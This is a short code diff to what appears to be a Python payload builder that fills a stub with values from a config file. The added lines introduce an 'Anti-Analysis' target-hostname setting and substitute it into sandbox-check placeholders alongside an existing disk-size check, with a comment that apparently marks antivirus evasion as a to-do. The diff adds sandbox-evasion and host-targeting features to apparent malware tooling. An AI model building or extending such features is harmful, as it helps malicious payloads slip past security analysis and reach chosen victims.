@@ -22,6 +22,7 @@ USER_AGENT = config.get("Payload","user_agent")
 STUB_FILE = config.get("Stub", "filename")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
+TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
 
 WORKING_FOLDER = "temp/"
 
@@ -70,6 +71,9 @@ def main():
             if parts[0] == "SANDBOX":
                 if parts[1] == "DISKSIZE":
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
+                if parts[1] == "TARGET_HOSTNAME":
+                    sed_file(WORKING_FOLDER+filename, tag, TARGET_HOSTNAME)
+                # AVOID todo
 
 
     if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
